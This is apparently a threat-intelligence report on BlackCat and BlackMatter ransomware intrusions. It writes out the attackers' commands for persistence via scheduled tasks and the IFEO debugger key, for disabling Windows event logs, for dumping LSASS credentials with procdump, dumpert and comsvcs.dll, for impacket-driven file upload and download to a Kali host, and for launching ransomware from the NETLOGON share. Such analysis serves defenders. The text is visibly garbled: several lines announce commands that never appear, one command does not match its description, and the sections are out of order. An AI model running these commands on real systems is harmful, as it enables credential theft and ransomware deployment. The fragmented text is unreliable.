Initial access

There was evidence in the BlackMatter attack that the actor established initial access via the possible exploitation of Microsoft Exchange vulnerabilities.

Beyond the access provided by the first exploitation vector, the attackers made sure they had additional remote access to several internal systems.

During the BlackCat attack, the actors used a tool called reverse-ssh, compiled with the C2 server address embedded, to set up reverse SSH tunnels and provide reverse shells to the attacker.

Reverse-ssh was deployed to C:\ directory and named: system, Windows or cache task.

It was also observed hidden by writing to an alternate data stream (ADS) of the C:\ directory using the following command:

c:\windows\system32\schtasks.exe /run /tn microsoft\windows\wininet\cachetask

The "image file execution option" debugger registry key was another way to ensure the malicious file would be persistently executed on the system:

c:\windows\system32\reg.exe add hklm\software\microsoft\windows nt\currentversion\image file execution options\taskmgr.exe /v debugger /t reg_sz /d c:\system

During the BlackMatter attack, the group used a similar technique but with a different tool: GO Simple Tunnel (GOST).

GOST is a Go-based tunneling tool that was used to establish a reverse SSH tunnel to an attacker-controlled C2 server.

The name used for the deployed Gost file was "system.exe", similar to the file name used in the BlackCat attack for reverse-ssh.

For example, before setting up the reverse-ssh scheduled task tool attackers disabled logs for the task scheduler (a full list of disabled logs is provided in the IOC section below).

c:\windows\system32\wevtutil.exe set-log microsoft-windows-taskscheduler/operational /enabled:false

The anti-rootkit tool Gmer was loaded into a small number of key systems.

c:\users\<username>\downloads\gmer\gmer.exe

Local and domain user credentials were collected, on a few key systems, by dumping the LSASS process memory and extracting credentials with Microsoft Sysinternals Procdump and Dumpert:

c:\windows\system\procdump.exe -accepteula -ma lsass.exe lsass.dmp

c:\windows\system\dumpert.exe lsass.exe

During the BlackMatter attack, the attacker used comsvcs.dll directly to dump LSASS memory:

powershell rundll32.exe c:\windows\system32\comsvcs.dll, minidump (get-process lsass).id c:\temp\lsass.dmp full

Beyond the Windows login credentials, during the BlackCat attack, the attackers used a tool named "steal.exe" to harvest additional data.

ADRecon was also used to collect information from Active Directory and its key servers.

c:\windows\system32\windowspowershell\v1.0\powershell.exe -exec bypass .\adrecon.ps1

During the BlackMatter attack, the attackers also searched for additional ways to maintain access.

For example, the following command shows the attackers exploring an existing TeamViewer installation:

The following commands show the attackers exploring the keepass password manager config:

This tool's activity can be detected by detecting processes created by wmipsrv.exe that terminate with the following string:

This tool was often used to issue a command to allow WinRM service network connections through the firewall, possibly for the convenience of using some prepared scripts:

WinRM allows attackers to use PowerShell to execute commands on remote machines.

This tool can be detected by searching for processes started by "wsmprovhost.exe".

c:\windows\system32\wevtutil.exe set-log active directory web services /enabled:false

c:\windows\system32\wevtutil.exe set-log hardwareevents /enabled:false

c:\windows\system32\wevtutil.exe set-log internet explorer /enabled:false

Microsoft Remote Desktop was also used by the attackers to obtain GUI access to systems.

The following impacket command was issued before the adversary could gain remote admin access.

cmd.exe /q /c reg add hkey_local_machine\system\currentcontrolset\control\lsa /v disablerestrictedadmin /t reg_dword /d 0 1> \\127.0.0.1\admin\$\__<timestamp>\.<num> 2>&1

Interestingly, due to what seems to be an OPSEC mistake using the attacker's shell upload and download command, they revealed the use of Kali Linux to execute remote commands.

cmd.exe /q /c #upload c:\users\<user>\documents\<doc> /home/kali/desktop/<doc> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1

cmd.exe /q /c #download c:\users\<user>\documents\<doc> /home/kali/desktop/<doc> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1

It is unlikely that the attackers had a Kali Linux installation inside the victim's network, so remote control of the systems was likely achieved through the SSH tunnels described earlier.

It is possible that document exfiltration is carried out by the execution of upload/download commands similar to the ones listed above.

In both attacks, before the actual execution of the ransomware, the attackers performed several actions preparing systems to make the execution as successful as possible.

On the day of the attack, the attacker logged in to the domain controller and opened the group policy management interface.

The attackers then dropped and executed a file named "apply.ps1."

c:\windows\system32\windowspowershell\v1.0\powershell.exe -exec bypass .\apply.ps1

This execution results in the immediate writing of group policy files to disk and is followed by the execution of the following command to force the deployment of the group policy:

A few minutes before BlackCat ransomware started encrypting files, the attackers executed a script called "defender.vbs":

In the BlackMatter attack, the exact same file was named "def.vbs" and executed minutes before the encryption began:

cmd.exe /c \\<domaincontroller>\netlogon\def.vbs

When encryption begins, the ransomware file named <num>.exe in the BlackCat attack and, similarly, <num>.exe in the BlackMatter attack, was dropped on the domain servers inside the SYSVOL folder, making it accessible on the NETLOGON network share, accessible by all users in the domain.

File encryption makes all systems execute these files from the remote share.

cmd.exe -c \\<domain controller>\netlogon\<num>.exe --access-token <token>

cmd.exe -c \\<domain controller>\netlogon\<num>.exe

<num>.exe -access-token <token> -v -p \\<hostname>\scans

<num>.exe -access-token <token> -v -p .

The BlackCat executable deployed other commands to make its execution more effective:

c:\windows\system32\cmd.exe /c fsutil behavior set symlinkevaluation r2l:1

